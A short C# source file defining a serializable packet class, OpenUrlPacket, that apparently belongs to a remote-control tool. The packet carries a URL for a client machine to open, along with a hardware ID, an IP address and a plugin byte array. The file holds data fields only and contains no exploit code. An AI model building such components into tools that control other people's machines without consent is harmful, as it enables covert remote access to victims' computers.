using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class OpenUrlPacket : IPacket
    {
        public OpenUrlPacket(string url) : base()
        {
            this.packetType = PacketType.MISC_OPEN_WEBSITE_LINK;
            this.url = url;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string url { get; set; }
    }
}
